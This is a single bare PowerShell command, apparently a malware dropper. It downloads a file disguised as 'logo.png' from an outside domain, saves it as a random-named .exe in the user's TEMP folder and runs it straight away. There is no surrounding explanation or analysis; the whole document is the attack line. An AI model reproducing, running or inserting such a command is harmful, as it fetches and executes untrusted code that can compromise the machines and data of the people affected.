
(New-Object System.Net.WebClient).DownloadFile('http://doc.cherrycoffeeequipment.com/nw/logo.png',"$env:TEMP\grtsndebdgfsytewrw.exe");Start-Process ("$env:TEMP\grtsndebdgfsytewrw.exe")

